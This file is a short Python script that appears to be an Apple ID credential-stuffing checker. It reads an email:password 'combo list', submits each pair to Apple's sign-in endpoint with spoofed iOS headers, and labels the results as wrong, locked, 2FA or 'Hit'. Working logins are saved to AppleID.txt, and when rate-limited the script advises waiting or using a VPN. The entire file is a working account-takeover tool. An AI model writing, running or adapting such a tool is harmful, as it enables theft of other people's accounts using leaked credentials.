import requests,os
from time import sleep
from getuseragent import UserAgent
ua = UserAgent("ios").Random()
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
def whisper(email,psw):
 head={"Accept": "application/json, text/javascript, */*; q=0.01","User-Agent":ua,"X-Apple-Locale":"DZ-EN","X-Apple-Trusted-Domain": "https://idmsa.apple.com","Origin": "https://idmsa.apple.com","X-Requested-With": "XMLHttpRequest"}
 json={"accountName":email,"rememberMe":"false","password":psw}
 res=requests.post('https://idmsa.apple.com/appleauth/auth/signin',json=json,headers=head).text
 if 'Your Apple\xa0ID or password was incorrect.' in res:
  print(f'{E}[×] Wrong : {S}{email} | {psw}')
 elif "This Apple ID has been locked for security reasons. Visit iForgot to reset your account (https://iforgot.apple.com)." in res:
  print(f'{S}[×] Locked : {B}{email} | {psw}')
 elif 'authType' in res:
  print(f'{G}[√] Hit : {B}{email} | {psw}')
  with open('AppleID.txt','a+') as boy:
   boy.write(f'{email}:{psw}\n')
 elif "hsa2" in res:
  print(f'{B}[=] 2FA : {G}{email} | {psw}')
 elif "The request cannot be processed at this time. Please try again later." in res:
  whisper(email,psw)
 elif '503 Service Temporarily Unavailable' in res:
  print(f'{B}[+] Sleep 60Sec Or Use VPN')
  sleep(60)
  whisper(email,psw)
 else:
  print(res)
os.system('cls')
os.system('clear')
print(f'{E}ـ'*40)
path=input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ'*40)
for whis in open(path,'r').read().splitlines():
  acc=str(whis)
  acc=acc.split('\n')[0]
  email=acc.split(':')[0]
  psw=acc.split(':')[1].split(' ')[0]
  whisper(email,psw)
